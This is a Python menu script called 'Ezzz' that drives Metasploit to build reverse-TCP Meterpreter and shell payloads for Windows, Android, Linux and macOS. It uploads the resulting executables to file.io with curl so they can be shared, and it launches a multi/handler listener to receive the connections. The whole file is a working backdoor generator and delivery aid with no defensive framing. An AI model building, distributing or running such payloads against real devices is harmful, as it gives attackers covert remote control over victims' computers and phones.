import os
import sys
def clear():
	os.system('clear')
clear()
os.system('resize -s 24 80 > /dev/null')
#-----------------------------------------------------
def localip():
	os.system('hostname -I')
def publicip():
	os.system('dig +short myip.opendns.com @resolver1.opendns.com')
def ipsqr():
	print(color.RED+"-----------------"+color.END)
	print(color.GREEN+color.BOLD+"Your Local-IP:")
	localip()
	print(color.END+color.RED+"-----------------"+color.END)	
	print(color.GREEN+color.BOLD+"Your Public-IP:")
	publicip()
	print(color.END+color.RED+"-----------------"+color.END)	
#-----------------------------------------------------
def payload_inpt():
	global ip,portno,pname
	ip = input("Enter IP Address : ")
	portno = input("Enter Unique Port No : ")
	pname = input("Enter Payload Name : ")
#-----------------------------------------------------
def payload_win():
	os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost='+ip+' lport='+portno+' -f exe -o ~/Desktop/'+pname+'.exe')
def payload_and():
	os.system('msfvenom -p android/meterpreter/reverse_tcp lhost='+ip+' lport='+portno+' R -o ~/Desktop/'+pname+'.apk')	
def payload_lnx():
	os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp lhost='+ip+' lport='+portno+' -f elf -o ~/Desktop/'+pname+'.elf')
def payload_mac():
	os.system('msfvenom -p osx/x86/shell_reverse_tcp lhost='+ip+' lport='+portno+' -f macho -o ~/Desktop/'+pname+'.macho')	
#-----------------------------------------------------
def lsnr_inpt():
	global ip,portno	
	ip = input("Enter IP Address : ")
	portno = input("Enter Unique Port No : ")
	print(color.YELLOW+color.BOLD + "Starting Listener..." + color.END)
def lsnr_win():
	cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
	os.system(cmnd)
def lsnr_and():
	cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
	os.system(cmnd)
def lsnr_lnx():
	cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'"
	os.system(cmnd)
def lsnr_mac():
	cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD osx/x86/shell_reverse_tcp; exploit'"
	os.system(cmnd)
#-----------------------------------------------------
def fileio():
	yn = input(color.GREEN+color.BOLD+"Do you want to host/upload this payload to share it further? (y/n)\n"+color.END)	
	if yn == 'y' or yn == 'Y' or yn == 'yes' or yn == 'YES':
		if payload == 1:
			path = "/root/Desktop/"+pname+".exe"
			cmnd = "curl -F file=@"+path+" https://file.io"
			os.system(cmnd)
		elif payload == 2:
			path = "/root/Desktop/"+pname+".apk"
			cmnd = "curl -F file=@"+path+" https://file.io"
			os.system(cmnd)
		elif payload == 3:
			path = "/root/Desktop/"+pname+".elf"
			cmnd = "curl -F file=@"+path+" https://file.io"
			os.system(cmnd)
		elif payload == 4:
			path = "/root/Desktop/"+pname+".macho"
			cmnd = "curl -F file=@"+path+" https://file.io"
			os.system(cmnd)
	elif yn == 'n' or yn == 'N' or yn == 'no' or yn == 'NO':
		return 0
	else:
		print(color.CYAN+color.BOLD+"LOL, What you really want to do?\nJust say"+color.GREEN+" YES"+color.END+" or"+color.RED+color.BOLD+" NO."+color.END)
		fileio()
#-----------------------------------------------------
def cont_lsnr():
	yn = str(input(color.GREEN+color.BOLD+"\nDo you want to start listener too? (y/n)\n"+color.END))
	if yn == 'y' or yn == 'Y' or yn == 'yes' or yn == 'YES':
		clear()
		print(color.YELLOW+color.BOLD+"Starting Listener..."+color.END)
		if payload == 1:
			lsnr_win()
		elif payload == 2:
			lsnr_and()
		elif payload == 3:
			lsnr_lnx()
		elif payload == 4:
			lsnr_mac()
	elif yn == 'n' or yn == 'N' or yn == 'no' or yn == 'NO':
		return 0
	else:
		print(color.CYAN+color.BOLD+"LOL, What you really want to do?\nJust say"+color.GREEN+" YES"+color.END+" or"+color.RED+color.BOLD+" NO."+color.YELLOW+color.BOLD+" But you lost this chance, try again now."+color.END)
#-----------------------------------------------------
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
#-----------------------------------------------------
print(color.GREEN+" _____\n| ____|____________\n|  _| |_  /_  /_  /\n| |___ / / / / / /_____ \n|_____/___/___/________>")
print(color.YELLOW + color.BOLD + "\n---------------------- Welcome to Ezzz ----------------------\n")
print(color.GREEN + "[1] Create Payload")
print("[2] Start Listener")
print("[3] Other Useful Tools")
print("[4] Tools For Fun!\n")
print("[99] Exit\n"+color.END)

val = int(input(color.BOLD+"Select Your Option To Begin Your Journey : "+color.END))

if val == 1:
	clear()
	print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [1] Create Payload")
	print(color.YELLOW+"\nLet's craft some payloads!\nObviously, for that you need to select something...")
	print(color.GREEN+"\n[1] Windows")
	print("[2] Android")
	print("[3] Linux")
	print("[4] Mac")
	print("[5] Create for all of above at once")
	print("\n[99] Exit" + color.END)
	payload = int(input("\nSelect Option : "))
	if payload == 1:
		clear()
		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [1] Create Payload > [1] Windows"+color.END)
		ipsqr()
		payload_inpt()		
		print(color.YELLOW+color.BOLD+"\nCreating Windows payload..."+color.END)
		payload_win()
		fileio()
		cont_lsnr()
	elif payload == 2:
		clear()
		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [1] Create Payload > [2] Android"+color.END)
		ipsqr()
		payload_inpt()
		print(color.YELLOW+color.BOLD+"\nCreating Android payload..."+color.END)
		payload_and()
		fileio()
		cont_lsnr()
	elif payload == 3:
		clear()
		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [1] Create Payload > [3] Linux"+color.END)
		ipsqr()
		payload_inpt()
		print(color.YELLOW+color.BOLD+"\nCreating Linux payload..."+color.END)
		payload_lnx()
		fileio()
		cont_lsnr()
	elif payload == 4:
		clear()
		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [1] Create Payload > [4] Mac"+color.END)
		ipsqr()
		payload_inpt()
		print(color.YELLOW+color.BOLD+"\nCreating Mac payload..."+color.END)
		payload_mac()
		fileio()
		cont_lsnr()
	elif payload == 5:
		clear()
		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [1] Create Payload > [5] Create for all of above at once"+color.END)
		ipsqr()
		payload_inpt()
		print(color.YELLOW+color.BOLD+"\nCreating Windows payload..."+color.END)
		payload_win()
		print(color.YELLOW+color.BOLD+"Windows payload created at ~/Desktop/"+pname+".exe"+color.END)

		print(color.YELLOW+color.BOLD+"\nCreating Android payload..."+color.END)
		payload_and()
		print(color.YELLOW+color.BOLD+"Android payload created at ~/Desktop/"+pname+".apk"+color.END)

		print(color.YELLOW+color.BOLD+"\nCreating Linux payload..."+color.END)
		payload_lnx()
		print(color.YELLOW+color.BOLD+"Linux payload created at ~/Desktop/"+pname+".elf"+color.END)

		print(color.YELLOW+color.BOLD+"\nCreating Mac payload..."+color.END)
		payload_mac()
		print(color.YELLOW+color.BOLD+"Mac payload created at ~/Desktop/"+pname+".macho"+color.END)
	elif val == 99:
	    exit

elif val == 2:
	clear()
	print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [2] Start Listener")
	print(color.YELLOW+color.BOLD+"\nSelect Listener For Your Payload Accordingly\n"+color.END)
	print(color.GREEN + color.BOLD + "[1] Windows")
	print("[2] Android")
	print("[3] Linux")
	print("[4] Mac\n")
	print("[99] Exit"+ color.END)
	listener = int(input("Select Option : "))
	if listener == 1:
		clear()
		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [2] Start Listener > [1] Windows"+color.END)
		lsnr_inpt()
		lsnr_win()
	elif listener == 2:
		clear()
		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [2] Start Listener > [2] Android"+color.END)
		lsnr_inpt()
		lsnr_and()
	elif listener == 3:
		clear()
		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [2] Start Listener > [3] Linux"+color.END)
		lsnr_inpt()
		lsnr_lnx()
	elif listener == 4:
		clear()
		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  [2] Start Listener > [4] Mac"+color.END)
		lsnr_inpt()
		lsnr_mac()
	elif val == 99:
		exit
elif val == 3:
	clear()
	print(color.BLUE+color.BOLD+"You are at:\nEzzz > [3] Other Useful Tools")
	print(color.YELLOW+"\nOther useful tool is currently in developing mode :D\nStay tuned!\n")
elif val == 4:
	clear()
	print(color.BLUE+color.BOLD+"You are at:\nEzzz > [4] Tools For Fun!")
	print(color.YELLOW+"\nInteresting tools are in developing mode :D\nStay tuned!\n")
elif val == 99:
	exit
else:
	print(color.RED+color.BOLD+"\nSelect from available options only, Obviously.\n"+color.END)
